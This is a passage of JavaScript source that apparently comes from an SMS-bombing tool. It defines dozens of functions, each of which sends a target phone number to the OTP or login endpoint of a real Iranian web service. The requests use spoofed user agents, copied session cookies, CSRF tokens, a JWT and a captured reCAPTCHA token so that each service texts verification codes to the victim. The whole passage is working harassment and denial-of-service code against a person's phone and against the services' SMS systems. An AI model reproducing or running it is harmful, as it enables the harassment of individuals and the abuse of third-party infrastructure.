              'Cookie': "XSRF-TOKEN=eyJpdiI6IjlMNThUT20ybWljbkRFTGZycTFPcGc9PSIsInZhbHVlIjoiMW9JajlWR1VHQXE4akFIRWFobmFhZ2wxTHU5eDFPbnlCSnlTb05SZWJZUThvOHlCb0ZsRFoxTVJNSUV2OE9oeGRhVnVoXC9yOVYyc2dOWW8wRVdcL2N0T1BzS0YyYWJXbGpVRVwvdFJJaHF0UzVKa0VMNFRNQVlickFJZDJTV2c3cmIiLCJtYWMiOiI4NWE0N2FiMzRhNDY1NzZhMDdmOWU0NWQyM2UwZjE3M2JjN2ViZTRiNjZmMmI0YTQxZTI2YmZhODY4OGY1NWY0In0%3D; laravel_session=eyJpdiI6IkxKcHNMR2RCZjltbHNpS1pDT05rRnc9PSIsInZhbHVlIjoiWWRkekpNQ1JJZVJwY0syUmR1VjNob0NVODBcL1NvZDJIenZTZVRxbEVwRmlRcGQ2RlhqR01kOWVGQkpQWkQ1Mml5TTdKa0Y5cDVEMWkxK01UVVBLaGh3YUt0eWk5YnA4QStXdXhxdVwvNVRKWEVvMVNoVTN3eGlqSlwvVFNOUTc3NEYiLCJtYWMiOiI0ZmFjOTFlMTFjNDg4MDY2NmI3OGVjOWFlYTkwYzVkZjJlMzhmN2NjZjIzYmZhZTBiNzU5OWNmZDY4OGUzZWM4In0%3D; view_uuid=eyJpdiI6InJ4NHdsSGZsZlBhdWZWWDJ6RUZHckE9PSIsInZhbHVlIjoiNjVQNTZBRjJud0FVTVBhUHJRTGl3YVFFNFpraUQycWp3dVlGZjNINzN6ZVNqMEFFVVlmbDk3Z2dDN0ZkXC9NZCs5Nm1ra0hJQUNMZGV5UmlRZXB1WHI0UHpIMnllcVZ2ajVEZW1rakpZYTY0PSIsIm1hYyI6ImM1ZGE3NGZkMjUwNzQzZWJiMDA2YmU4YzY4NTMwMjA3Y2YxMmJhNjMxOGMxNWEwOWZkZTI3MWIwNzM4MzM4OGQifQ%3D%3D; analytics_campaign={%22source%22:%22google%22%2C%22medium%22:%22organic%22}; analytics_token=90293786-d881-67c2-8354-7ac8a09e02c4; _ga_D7BD2VHEBX=GS1.1.1709982693.2.0.1709982693.60.0.0; _ga=GA1.1.1577467020.1709649514; _yngt=b5b3fe20-02ecf-f1a72-2cadc-caa0cea202ca8; analytics_session_token=923623dd-be84-f963-9fed-517269d8f53b; yektanet_session_last_activity=3/9/2024; _yngt_iframe=1",
              "Sec-Fetch-Dest": "empty",
              "Sec-Fetch-Mode": "cors",
              "Sec-Fetch-Site": "same-origin",
            };

            await axios
              .post(url, body, { headers: header })
              .then((res) => {
                console.log(res.statusText);
              })
              .catch(() => {
                console.log("Error");
              });
          };

          const behtarino = async () => {
            const url =
              "https://bck.behtarino.com/api/v1/users/jwt_phone_verification/";
            const body = { phone: number };
            const header = {
              'Host': "bck.behtarino.com",
              "User-Agent": genUserAgent(),
              'Accept': "application/json",
              "Accept-Language": "en-US, en; q = 0.5",
              "Accept-Encoding": "gzip, deflate, br",
              'Referer': "https://behtarino.com/",
              "Content-Length": "23",
              'Origin': "https://behtarino.com",
              'Connection': "keep-alive",
              "Sec-Fetch-Dest": "empty",
              "Sec-Fetch-Mode": "no-cors",
              "Sec-Fetch-Site": "same-site",
              'TE': "trailers",
              "Content-Type": "application/json",
              'Site': "behtarino",
              'Pragma': "no-cache",
              "Cache-Control": "no-cache",
            };

            await axios
              .post(url, body, { headers: header })
              .then((res) => {
                console.log(res.status);
              })
              .catch(() => {
                console.log("Error");
              });
          };

          const javaherbazar = async () => {
            const url =
              "https://www.javaherbazar.com/content/modules/landingPage/pwa/save.php?t=1709985256644";
            const body = `m=${number}&s=0&rem=0`;
            const header = {
              'Host': "www.javaherbazar.com",
              "User-Agent": genUserAgent(),
              'Accept': "*/*",
              "Accept-Language": "en-US, en; q = 0.5",
              "Accept-Encoding": "gzip, deflate, br",
              'Referer': "https://www.javaherbazar.com/lp/pwa/login/",
              "Content-Length": "23",
              'Origin': "https://www.javaherbazar.com",
              'Connection': "keep-alive",
              'Cookie': "analytics_campaign={%22source%22:%22google%22%2C%22medium%22:%22organic%22}; analytics_token=3fe664a7-9384-5cd4-9c5e-3a83e11c662b; _yngt=0ad51ac1-7afe-4c38-8c41-6d6e688a15dc; _wmuid=ad3b14ddde53829364fa8a7adf6ddb86; _ga_P5P1CJCKWJ=GS1.1.1709985239.2.1.1709985247.0.0.0; _ga=GA1.1.422965381.1709648187; jbzPwaAppId=158.58.116.116-56575; PHPSESSID=1d3040a5f580d829366625b53e0cb967; _is_allow_cookie_=1; analytics_session_token=122a8418-44f8-6bd6-d36e-991fc4c2e745; yektanet_session_last_activity=3/9/2024; _yngt_iframe=1",
              "Sec-Fetch-Dest": "empty",
              "Sec-Fetch-Mode": "no-cors",
              "Sec-Fetch-Site": "same-origin",
              'TE': "trailers",
              "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
              "X-Requested-With": "XMLHttpRequest",
              'Pragma': "no-cache",
              "Cache-Control": "no-cache",
            };

            await axios
              .post(url, body, { headers: header })
              .then((res) => {
                console.log(res.status);
              })
              .catch(() => {
                console.log("Error");
              });
          };

          const balad = async () => {
            const url = "https://account.api.balad.ir/api/web/auth/login/";
            const body = { phone_number: number, os_type: "W" };
            const header = {
              'Host': "account.api.balad.ir",
              "User-Agent": genUserAgent(),
              'Accept': "application/json,text/plain, */*",
              "Accept-Language": "en-US,en;q=0.5",
              "Accept-Encoding": "gzip, deflate, br",
              'Referer': "https://balad.ir/",
              "Content-Length": "44",
              'Origin': "https://balad.ir",
              'Connection': "keep-alive",
              "Sec-Fetch-Dest": "empty",
              "Sec-Fetch-Mode": "no-cors",
              "Sec-Fetch-Site": "same-site",
              'TE': "trailers",
              "Content-Type": "application/json",
              "device-id": "22b0535a-b601-4696-b0f9-29d7b9bf3f4e",
              'Pragma': "no-cache",
              "Cache-Control": "no-cache",
            };

            await axios
              .post(url, body, { headers: header })
              .then((res) => {
                console.log(res.statusText);
              })
              .catch(() => {
                console.log("Error");
              });
          };

          const classino = async () => {
            const url = "https://student.classino.com/otp/v1/api/login";
            const body = { mobile: number };
            const header = {
              'Host': "student.classino.com",
              "User-Agent": genUserAgent(),
              'Accept': "application/json",
              "Accept-Language": "en-US,en;q=0.5",
              "Accept-Encoding": "gzip, deflate, br",
              'Referer': "https://student.classino.com/auth/login",
              "Content-Length": "24",
              'Origin': "https://student.classino.com",
              'Connection': "keep-alive",
              'Cookie': "_ga_6H76W47JHN=GS1.1.1709986807.2.1.1709986825.42.0.0; _ga=GA1.1.554177302.1709576193; analytics_token=c911a695-256b-6917-10e4-d2032f412bbf; _yngt=2e8a1a0f-f3724-447be-e03be-e0b0322b91cbe; analytics_session_token=94371d50-97a2-2542-6c0c-edad58c1541b; yektanet_session_last_activity=3/9/2024; _yngt_iframe=1",
              "Sec-Fetch-Dest": "empty",
              "Sec-Fetch-Mode": "no-cors",
              "Sec-Fetch-Site": "same-origin",
              "Content-Type": "application/json",
              'Authorization': "Bearer null",
              'Pragma': "no-cache",
              "Cache-Control": "no-cache",
            };

            await axios
              .post(url, body, { headers: header })
              .then((res) => {
                console.log(res.status);
              })
              .catch(() => {
                console.log("Error");
              });
          };

          const snap = async () => {
            const url = "https://app.snapp.taxi/api/api-passenger-oauth/v3/mutotp";
            const body = {
              cellphone: `+98${withoutZero}`,
              attestation: { method: "skip", platform: "skip" },
              extra_methods: [],
            };
            const header = {
              'Host': "app.snapp.taxi",
              "User-Agent": genUserAgent(),
              'Accept': "*/*",
              "Accept-Language": "en-US,en;q=0.5",
              "Accept-Encoding": "gzip, deflate, br",
              "Content-Type": "application/json",
              "Content-Length": "98",
              'Referer': "https://app.snapp.taxi/login/?redirect_to=%2F",
              'Origin': "https://app.snapp.taxi",
              "Sec-Fetch-Dest": "empty",
              "Sec-Fetch-Mode": "no-cors",
              "Sec-Fetch-Site": "same-origin",
              'locale': "fa-IR",
              "App-Version": "pwa",
              "x-app-version": "17.12.1",
              "x-app-name": "passenger-pwa",
              'Connection': "keep-alive",
              'TE': "trailers",
              'Pragma': "no-cache",
              "Cache-Control": "no-cache",
            };

            await axios
              .post(url, body, { headers: header })
              .then((res) => {
                console.log(res.status);
              })
              .catch(() => {
                console.log("Error");
              });
          };

          const barghman = async () => {
            await axios
              .post("https://uiapi2.saapa.ir/api/otp/sendCode", {
                mobile: number,
                from_meter_buy: false,
              })
              .then((res) => {
                console.log(res.statusText);
              })
              .catch(() => {
                console.log("Error");
              });
          };

          const mahdimaleki = async () => {
            const url = "https://mahdimaleki.ir/wp-admin/admin-ajax.php";
            const body = `action=digits_check_mob&countrycode=%2B98&mobileNo=${number}&csrf=92b723230e&login=2&username=&email=&captcha=&captcha_ses=&json=1&whatsapp=0`;

            await axios
              .post(url, body)
              .then((res) => {
                console.log(res.status);
              })
              .catch(() => {
                console.log("Error");
              });
          };

          const zarinpal = async () => {
            const url = "https://next.zarinpal.com/api/oauth/initialize";
            const body = { username: number };
            const header = {
              'Host': "next.zarinpal.com",
              "User-Agent": genUserAgent(),
              'Accept': "application/json,text/plain, */*",
              "Accept-Language": "en-US,en;q=0.5",
              "Accept-Encoding": "gzip, deflate, br",
              'Referer': "https://next.zarinpal.com/auth/login",
              "Content-Length": "26",
              'Origin': "https://next.zarinpal.com",
              'Connection': "keep-alive",
              'Cookie': "analytics_campaign={%22source%22:%22google%22%2C%22medium%22:%22organic%22}; _ga_EZMH3N3MGD=GS1.1.1709989692.3.1.1709989717.35.0.0; _ga=GA1.2.1393935084.1709157221; analytics_token=2f84b8a1-fc61-9695-eee5-1e87c4342cbf; _yngt=e5e6ea5b-be10d-d39d7-76161-15f426bca31a1; _clck=11yjr5w%7C2%7Cfjx%7C0%7C1519; _hjSessionUser_141624=eyJpZCI6IjljZjVkZDBmLTliODUtNWQwZC1iNmJjLTk5NWM0ZmZmNWJmOCIsImNyZWF0ZWQiOjE3MDkxNTcyMjQwOTksImV4aXN0aW5nIjp0cnVlfQ==; _hantanaUser=ek4d59nak; analytics_session_token=80f074d7-424b-66ad-da6b-6700bb7aac97; yektanet_session_last_activity=3/9/2024; _yngt_iframe=1; _gid=GA1.2.1371215715.1709989695; _gat_UA-19706501-5=1; _hjSession_141624=eyJpZCI6ImJlZDQyNWJiLWJiMGEtNDc3MC1hNTQ1LWIxYzIzYzE3ZDdlZSIsImMiOjE3MDk5ODk2OTU2OTQsInMiOjAsInIiOjAsInNiIjowLCJzciI6MCwic2UiOjAsImZzIjowLCJzcCI6MX0=; _clsk=ktps58%7C1709989714549%7C3%7C1%7Cu.clarity.ms%2Fcollect",
              "Sec-Fetch-Dest": "empty",
              "Sec-Fetch-Mode": "no-cors",
              "Sec-Fetch-Site": "same-origin",
              "Content-Type": "application/json;charset=utf-8",
              'Pragma': "no-cache",
              "Cache-Control": "no-cache",
            };

            await axios
              .post(url, body, { headers: header })
              .then((res) => {
                console.log(res.status);
              })
              .catch(() => {
                console.log("Error");
              });
          };

          const basalam = async () => {
            await axios
              .post("https://auth.basalam.com/otp-request", {
                mobile: number,
                client_id: 11,
              })
              .then((res) => {
                console.log(res.statusText);
              });
          };

          const gamegifts = async () => {
            await axios
              .post(
                "https://gamegifts.ir/wp-admin/admin-ajax.php",
                `email=fwfwf%40gmail.com&digt_countrycode=%2B98&phone=${withoutZero}&digits_reg_password=sffwfwf3t&digits_process_register=1&sms_otp=&otp_step_1=1&digits_otp_field=1&instance_id=5a2271756d70b53ca681e24cfa7d0ecd&optional_data=optional_data&action=digits_forms_ajax&type=register&dig_otp=otp&digits=1&digits_redirect_page=-1&digits_form=d39a986af4&_wp_http_referer=%2F%3Flogin%3Dtrue%26page%3D1%26redirect_to%3Dhttps%253A%252F%252Fgamegifts.ir%252F&container=digits_protected&sub_action=sms_otp`
              )
              .then((res) => {
                console.log(res.statusText);
              })
              .catch(() => {
                console.log("Error");
              });
          };

          const abantether = async () => {
            const url = "https://abantether.com/users/register/phone/send/";
            const body = { phoneNumber: number, email: "" };
            const header = {
              'Host': "abantether.com",
              "User-Agent": genUserAgent(),
              'Accept': "application/json,text/plain, */*",
              "Accept-Language": "fa",
              "Accept-Encoding": "gzip, deflate, br",
              'Referer': "https://abantether.com/",
              "Content-Length": "40",
              'Origin': "https://abantether.com",
              'Connection': "keep-alive",
              'Cookie': "analytics_campaign={%22source%22:%22google%22%2C%22medium%22:%22organic%22}; analytics_token=b64c0a19-8aa1-49de-1b4e-83fa56afc010; _yngt=3159af32-2708c-c0046-6895d-d7eeaafd3719d; _gcl_au=1.1.695865353.1709152332; _ga_8D222KQZJP=GS1.1.1709990746.2.1.1709990768.38.0.0; _ga=GA1.2.1025677532.1709152333; __arcsco=1b14018b42765eec985eda063aca078a; analytics_session_token=853eed1e-e00d-5cc6-c268-94d80915c92e; yektanet_session_last_activity=3/9/2024; _yngt_iframe=1; dMode=false; _gid=GA1.2.1001409120.1709990747; _gat_gtag_UA_177862588_1=1; _gat_UA-177862588-1=1",
              "Sec-Fetch-Dest": "empty",
              "Sec-Fetch-Mode": "no-cors",
              "Sec-Fetch-Site": "same-origin",
              'TE': "trailers",
              "Content-Type": "application/json",
              'Pragma': "no-cache",
              "Cache-Control": "no-cache",
            };

            await axios
              .post(url, body, { headers: header })
              .then((res) => {
                console.log(res.statusText);
              })
              .catch(() => {
                console.log("Error");
              });
          };

          const deniizshop = async () => {
            const header = {
              'Host': "deniizshop.com",
              "User-Agent": genUserAgent(),
              'Accept': "application/json,text/plain, */*",
              "Accept-Language": "en-US,en;q=0.5",
              "Accept-Encoding": "gzip, deflate, br",
              'Referer': "https://deniizshop.com/profile",
              "Content-Type": "application/json;charset=utf-8",
              'Authorization': "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJkYXRhIjp7ImV4cGlyZXNfYXQiOiIyMDI0LTAzLTE0VDEzOjI0OjUwLjU2NDQwMTMxNloiLCJzdWJkb21haW4iOiJkZW5paXpzaG9wIiwidXNlciI6eyJlbWFpbCI6ImFpamRhQGdtYWlsLmNvbSIsImZpcnN0X25hbWUiOiIiLCJpZCI6MTA1ODcsImxhc3RfbmFtZSI6IiIsInJvbGVzIjpbXSwic2hpcHBpbmdfYWRkcmVzc2VzIjpudWxsLCJzb2xkIjpudWxsLCJzb2xkX2Ftb3VudCI6bnVsbH19fQ.aNTb-MY-QiWkHCuYVkXTPkDQrri-UsN2RM6j2Hr7zNs",
              "Content-Length": "30",
              'Origin': "https://deniizshop.com",
              'Connection': "keep-alive",
              'Cookie': "_gcl_au=1.1.2125964343.1709990650; _ga_B18MQGLNJ1=GS1.1.1709990650.1.1.1709990694.0.0.0; _ga=GA1.2.884890077.1709990650; _gid=GA1.2.1598819281.1709990656; _gat=1",
              "Sec-Fetch-Dest": "empty",
              "Sec-Fetch-Mode": "no-cors",
              "Sec-Fetch-Site": "same-origin",
              'TE': "trailers",
              'Pragma': "no-cache",
              "Cache-Control": "no-cache",
            };

            await axios
              .post(
                "https://deniizshop.com/api/v1/users/update_mobile_phone_request",
                { mobile_phone: number },
                { headers: header }
              )
              .then((res) => {
                console.log(res.status);
              })
              .catch(() => {
                console.log("Error");
              });
          };

          const flightio = async () => {
            await axios
              .post("https://flightio.com/bff/Authentication/CheckUserKey", {
                userKey: `98-${withoutZero}`,
                userKeyType: 1,
              })
              .then((res) => {
                console.log(res.status);
              })
              .catch(() => {
                console.log("Error");
              });
          };

          const zarinplus = async () => {
            await axios
              .post("https://api.zarinplus.com/user/zarinpal-login", {
                phone_number: `98${withoutZero}`,
                source: "zarinplus",
              })
              .then((res) => {
                console.log(res.statusText);
              })
              .catch(() => {
                console.log("Error => Zarinplus");
              });
          };

          const tap30 = async () => {
            await axios
              .post("https://api.tapsi.cab/api/v2.2/user", {
                credential: { phoneNumber: number, role: "PASSENGER" },
                otpOption: "SMS",
              })
              .then((res) => {
                console.log(res.status);
              })
              .catch(() => {
                console.log("Error => tap30");
              });
          };

          const divar = async () => {
            await axios
              .post("https://api.divar.ir/v5/auth/authenticate", { phone: number })
              .then((res) => {
                console.log(res.status);
              })
              .catch(() => {
                console.log("Error => Divar");
              });
          };

          const bama = async () => {
            const url =
              "https://account.bama.ir/Account/Login?ReturnUrl=%2Fconnect%2Fauthorize%2Fcallback%3Fprotocol%3Doauth2%26response_type%3Dcode%26client_id%3Dpopuplogin%26redirect_uri%3Dhttps%253A%252F%252Fbama.ir%252Fauth%26scope%3Dopenid%2520profile%2520offline_access%2520openid%2520profile%2520email%2520api%2520offline_access%26state%3DhwXPRMmHiN%26code_challenge_method%3DS256%26userContext%3D6d4f6c73-97dd-4139-b052-0c9f68a38c95%26code_challenge%3D-ZAqNxfDQXGV0dEWF_kE0XmnA4zLDbPJdLNgXc7upoI";
            const body = `LoginType=person&ReturnUrl=%2Fconnect%2Fauthorize%2Fcallback%3Fprotocol%3Doauth2%26response_type%3Dcode%26client_id%3Dpopuplogin%26redirect_uri%3Dhttps%253A%252F%252Fbama.ir%252Fauth%26scope%3Dopenid%2520profile%2520offline_access%2520openid%2520profile%2520email%2520api%2520offline_access%26state%3DhwXPRMmHiN%26code_challenge_method%3DS256%26userContext%3D6d4f6c73-97dd-4139-b052-0c9f68a38c95%26code_challenge%3D-ZAqNxfDQXGV0dEWF_kE0XmnA4zLDbPJdLNgXc7upoI&Username=${number}&Password=&RememberLogin=true&CSRF-TOKEN-BAMA-STS-FORM=CfDJ8FU9tf0_QtZAreWLoKjN3NcEq8upcdtEXvgUG2jTudPT9fl0VdRQmMzwY21aqcScYepgxSjUfzFzFhI177ZCoF7g_30hjIxAK3xivjsuBxjCCnuOInbPxvBHWo0SmiycZsiluE_pHtwf62m_-WFMfmI`;
            const header = {
              'Host': "account.bama.ir",
              "User-Agent": genUserAgent(),
              'Accept':
                "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
              "Accept-Language": "en-US,en;q=0.5",
              "Accept-Encoding": "gzip, deflate, br",
              'Referer': "https://account.bama.ir/Account/Login?ReturnUrl=%2Fconnect%2Fauthorize%2Fcallback%3Fprotocol%3Doauth2%26response_type%3Dcode%26client_id%3Dpopuplogin%26redirect_uri%3Dhttps%253A%252F%252Fbama.ir%252Fauth%26scope%3Dopenid%2520profile%2520offline_access%2520openid%2520profile%2520email%2520api%2520offline_access%26state%3DhwXPRMmHiN%26code_challenge_method%3DS256%26userContext%3D6d4f6c73-97dd-4139-b052-0c9f68a38c95%26code_challenge%3D-ZAqNxfDQXGV0dEWF_kE0XmnA4zLDbPJdLNgXc7upoI",
              "Content-Type": "application/x-www-form-urlencoded",
              "Content-Length": "689",
              'Origin': "https://account.bama.ir",
              "Alt-Used": "account.bama.ir",
              'Connection': "keep-alive",
              'Cookie': "_ga_W7213Q6KZ0=GS1.1.1710005760.1.1.1710005762.58.0.0; _ga=GA1.1.1124690863.1710005760; X-User-Context=6d4f6c73-97dd-4139-b052-0c9f68a38c95; HASH_X-User-Context=ae0af15c9cb641d1e4d17c6a3ac067ccf8ec3372; CSRF-TOKEN-BAMA-STS-COOKIE=CfDJ8FU9tf0_QtZAreWLoKjN3Ne8luGXxx6q3bCtUij8_PyGOOVmPQpN6JW0p6qH9aOA-jdevR4Q5qYGOdxnKVgVVi8J1In7uLMWCPnUTx5Cv87tcwXb9kci07WRbz3EXsrUfle5EhV9k_6Md9r9lcTvEtw; HASH_CSRF-TOKEN-BAMA-STS-COOKIE=297e2b00d389e9b8f02879783e8a6d016dee5b4a",
              "Upgrade-Insecure-Requests": "1",
              "Sec-Fetch-Dest": "iframe",
              "Sec-Fetch-Mode": "navigate",
              "Sec-Fetch-Site": "same-origin",
              "Sec-Fetch-User": "?1",
              'TE': "trailers",
            };

            await axios
              .post(url, body, { headers: header })
              .then((res) => {
                console.log(res.statusText);
              })
              .catch(() => console.log("Error => Bama"));
          };

          const snappfood = async () => {
            const url =
              "https://snappfood.ir/mobile/v2/user/loginMobileWithNoPass?lat=35.774&long=51.418&optionalClient=WEBSITE&client=WEBSITE&deviceType=WEBSITE&appVersion=8.1.1&UDID=afdef9c6-8e58-4183-96b4-faa990a6fdf6&locale=fa";
            const body = `cellphone=${number}`;

            await axios
              .post(url, body)
              .then((res) => {
                console.log(res.status);
              })
              .catch(() => {
                console.log("Error => snappfood");
              });
          };

          const alibaba = async () => {
            await axios
              .post("https://ws.alibaba.ir/api/v3/account/mobile/otp", {
                phoneNumber: number,
              })
              .then((res) => {
                console.log(res.status);
              })
              .catch(() => console.log("Error => alibaba"));
          };

          const snappMarket = async () => {
            await axios
              .post(
                `https://api.snapp.market/mart/v1/user/loginMobileWithNoPass?cellphone=${number}`
              )
              .then((res) => {
                console.log(res.statusText);
              })
              .catch(() => console.log("Error => snapp market"));
          };

          const mrbilit = async () => {
            const url = `https://auth.mrbilit.ir/api/login/exists/v2?mobileOrEmail=${number}&source=2&sendTokenIfNot=true`;
            await axios
              .get(url)
              .then((res) => {
                console.log(res.status);
              })
              .catch(() => console.log("Error => mrbilit"));
          };

          const snapptrip = async () => {
            const url = "https://www.snapptrip.com/register/resend";
            const body = { username: number };
            await axios.post(url, body).then((res) => {
              console.log(res.status);
            });
          };

          const filmnet = async () => {
            const url = `https://filmnet.ir/api-v2/access-token/users/${number}%20/otp`;
            await axios
              .get(url)
              .then((res) => {
                console.log(res.statusText);
              })
              .catch(() => {
                console.log("Error => filmnet");
              });
          };

          const DrDr = async () => {
            const header = {
              'Host': "drdr.ir",
              "User-Agent": genUserAgent(),
              'Accept': "application/json,text/plain,*/*",
              "Accept-Language": "en-US,en;q=0.5",
              "Accept-Encoding": "gzip, deflate, br",
              'Referer': "https://drdr.ir/",
              "Content-Length": "24",
              'Origin': "https://drdr.ir",
              'Connection': "keep-alive",
              'Cookie': "_gcl_au=1.1.1141091142.1710014129; _ga_VPMXG7C0RF=GS1.1.1710014129.1.0.1710014138.0.0.0; _ga=GA1.2.990840642.1710014130; _gid=GA1.2.431149097.1710014130; _gat_UA-101159391-1=1; _clck=1g0rfbl%7C2%7Cfjx%7C0%7C1529; crisp-client%2Fsession%2F929a93f7-17ea-492e-a5c1-3b1fd45f86b9=session_d19cd56e-81d9-4a6c-8daf-ecdf9f80fe68; analytics_session_token=8261298e-77b6-6a4c-9eff-1c526358dfe3; analytics_token=80782ca4-5990-44a3-7ba4-494d4803ade6; yektanet_session_last_activity=3/9/2024; _yngt_iframe=1; _yngt=52333418-84c6d-dd1ff-f2ed0-04b1ca39a020a; _clsk=1ctjkhm%7C1710014132978%7C1%7C1%7Ci.clarity.ms%2Fcollect",
              "Sec-Fetch-Dest": "empty",
              "Sec-Fetch-Mode": "no-cors",
              "Sec-Fetch-Site": "same-origin",
              'TE': "trailers",
              "Content-Type": "application/json",
              "client-id": "f60d5037-b7ac-404a-9e3a-a263fd9f8054",
              "Cache-Control": "no-store, max-age=0, no-cache",
              'Pragma': "no-cache",
            };

            await axios
              .post(
                "https://drdr.ir/api/v3/auth/login/mobile/init",
                { mobile: number },
                { headers: header }
              )
              .then((res) => {
                console.log(res.status);
              })
              .catch(() => console.log("Error => DrDr"));
          };

          const okala = async () => {
            const url = "https://okcs.com/users/mobilelogin";
            const body = `mobile=${number}&url=https%3A%2F%2Fokcs.com%2F`;
            const header = {
              'Host': "okcs.com",
              "User-Agent": genUserAgent(),
              'Accept': "*/*",
              "Accept-Language": "en-US,en;q=0.5",
              "Accept-Encoding": "gzip, deflate, br",
              'Referer': "https://okcs.com/",
              "Content-Length": "48",
              'Origin': "https://okcs.com",
              'Connection': "keep-alive",
              'Cookie': "PHPSESSID=6t4cvpp13ds260nh15k678af5j; user_lat=35.69434065128725; user_lng=51.39713294163812; _ga_PNX9G068M6=GS1.1.1710014673.1.0.1710014673.60.0.0; _ga=GA1.1.748086928.1710014673; analytics_session_token=88f14eeb-d7f7-c231-524e-e02d9eb4aca3; analytics_token=66db0c19-85e0-7fc4-b1d9-d2a714a9a66f; yektanet_session_last_activity=3/9/2024; _yngt_iframe=1; _yngt=8641d026-6e25a-a8a4d-de47f-ff6200555b152",
              "Sec-Fetch-Dest": "empty",
              "Sec-Fetch-Mode": "no-cors",
              "Sec-Fetch-Site": "same-origin",
              'TE': "trailers",
              "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
              "X-Requested-With": "XMLHttpRequest",
              "Alt-Used": "okcs.com",
              'Pragma': "no-cache",
              "Cache-Control": "no-cache",
            };

            await axios
              .post(url, body, { headers: header })
              .then((res) => console.log(res.status))
              .catch(() => console.log("Error => okala"));
          };

          const takshopaccessorise = async () => {
            await axios
              .post("https://takshopaccessorise.ir/api/v1/sessions/login_request", {
                mobile_phone: number,
              })
              .then((res) => console.log(res.statusText))
              .catch(() => console.log("Error => takshopaccessorise"));
          };

          const bitpin = async () => {
            await axios
              .post("https://api.bitpin.org/v2/usr/signin/", { phone: number })
              .then((res) => console.log(res.status))
              .catch(() => console.log("Error => bitpin"));
          };

          const otaghak = async () => {
            await axios
              .post(
                "https://core.otaghak.com/odata/Otaghak/Users/SendVerificationCode",
                { username: number, isShortOtp: true }
              )
              .then((res) => console.log(res.status))
              .catch(() => console.log("Error => otaghak"));
          };

          const shab = async () => {
            const url =
              "https://api.shab.ir/api/fa/sandbox/v_1_4/auth/check-mobile";
            const body = { mobile: number, country_code: "+98" };
            await axios
              .post(url, body)
              .then((res) => console.log(res.status))
              .catch(() => console.log("Error => Shab"));
          };

          const bit24 = () => {
            const url = "https://bit24.cash/auth/bit24/api/v3/auth/check-mobile";
            const body = { mobile: withoutZero, country_code: "98" };
            const header = {
              'Host': "bit24.cash",
              "User-Agent": genUserAgent(),
              'Accept': "application/json, text/plain, */*",
              "Accept-Language": "en-US,en;q=0.5",
              "Accept-Encoding": "gzip, deflate, br",
              "Content-Type": "application/json",
              "Content-Length": "44",
              'Referer': "https://bit24.cash/auth/",
              'Origin': "https://bit24.cash",
              "Sec-Fetch-Dest": "empty",
              "Sec-Fetch-Mode": "cors",
              "Sec-Fetch-Site": "same-origin",
              'Connection': "keep-alive",
              "Alt-Used": "bit24.cash",
              'Cookie': " _ga_5KMY06EFR8=GS1.1.1710019089.1.1.1710019094.55.0.0; _ga=GA1.1.1120659217.1710019090; lang=fa; crisp-client%2Fsession%2F7f08969b-d0f0-4d4e-a2df-67dba6fce113=session_a089eb54-808d-4a2c-9d4b-a539f9aefe9d",
              'TE': "trailers",
            };
            methods.postHeade(url, body, header, "Error => bit24");
          };

          const itoll = async () => {
            const url = "https://app.itoll.com/api/v1/auth/login";
            const body = { mobile: number };
            await axios
              .post(url, body)
              .then((res) => console.log(res.status))
              .catch(() => console.log("Error => itoll"));
          };

          const wisgoon = async () => {
            const url = "https://gateway.wisgoon.com/api/v1/auth/login/";
            const body = {
              token: "e622c330c77a17c8426e638d7a85da6c2ec9f455",
              phone: number,
              "recaptcha-response":
                "03AFcWeA6DG91jNtByn_k8SqrLsupCwZIeaNh7u7dz8yq3HbAH20y5sTboQ0LcnKVslfW66Mixy9AaJXlPzbCWHes7CsiBdedqVm17H6CBjvktRTNwSrCIPyMxVC7UoR5Dgz5UcPbw8W5msoomoZ0Tmn-8jssesl-aSSR1PDI3WXXLbD-ani4hBIb9PLnf5IFtDisMu5c4Px7GLm0anJWZPQNMhCT8X3gxL5JACEbtDBbyVVT09jZHyXrMuJ1xIkNeuH5PZNjjCkC8wO6wnsQizpeEjbEOGeA83WJtgQTknYjeB0Dd4YViutuGsyT84ncKvKXSRzbS0qpqoYA02oKx5FF9QQWr3V6vaWs9o40Lyr3HZk7UiRuCs_x9ScbWWGYzqyms8GP4z1KX-brZ8uSAFfEpLmmj0OOrhBVTKilcZ_T7DGO4SSsTjLnw5b-fMqlaKfXzNwpK7fa5c2WVXH-HDtgDLW6Qj1tQWJg5H9tl-pfQ6PqPhgLKt2UXsG-ipfuDOslkTMXTdpY2ciAYhawDv8paqbsCbmIzkJCYkuBiG-WKgc2g3LE0hvGdvIfsO2CPA29Pbx74lJGmxhZcx1iEUfsy7PULAubEFp2cwUciRXCBqKrHloesFATxGBScM8Lgh780sGpwWaMp4qzZUYjeqW32K0nCH3kVs7v3QEZt83HjU6Z68hxJsAOAyFeI8EAM4AHlHX2Kck6e5591hV7hqiz5smOpmoEcjpK6PmsmRACZUosORA9WQ5DOzFbRcDnqdfPzN_y9BxqpTCFkwvep6TTlqeBYTm3oGGeQA4-ndeA2_30q81gfwgslnAWbBUBbiltYkJhnZUfVZyiqNlKKvXQB1boo6748Ja00UftrAOtITPnpIRQfBIVKjJVeEQCLBDjEJ2WXTJBweH116NGxyfHXiwMuy2NnSaoNxPT3m5MNn8C_yScwZdXBQm0X4nup8ow_2aN5ltXmYGg2Ilu39VcxzQKbcqL80AMwBivtoKHRizP4o4TrEPGQrF-59raFaRv-J9Ak0P5hW3HAz_JtXm8nr7Ur2HFm1tnyVd6aBctlyM4r09VeQbti8PTm0NBUwTLNtEoJTFowSWsv0AuIEXmdbMeP3zPiQ_Wru75H9_1iv91pF9kbNNy_nG7YoCwz5iuqrGIk6pNOK8KH_zhiO4kHNCy5dmupZcNWH4tXjkPFDnwoTfdFZ7Unh8RvKXpQM5Y7AirIHIAPhlqAIr58OkqY3lav70AinL-Xxu5y5MX1T8SMkM1Sq6nCPJ6gUwOE-KNNQ2gljv3L56I3NTn-fbWR7DGu18HFpJQyXCQCABl86GqZ6O_K20kjjZnWtYUlrljIeIwCPySTBHiJk1MUJktumMbJEBwFiWbqx8fchDQIdabH8rhN2gxVa6fbZG7njnSMU6lAaAtomx20gQaJ4xzE308jhu2EbaB6UsM8f6RzFbny9pumU49XDHsIWR3ZMCiQiqcUilFhoO3ltFYiBnCCPbMfo64k8lnpm_0sSYvvh63jhZBmHX96KV8bDDsMI6DnT3JIszlE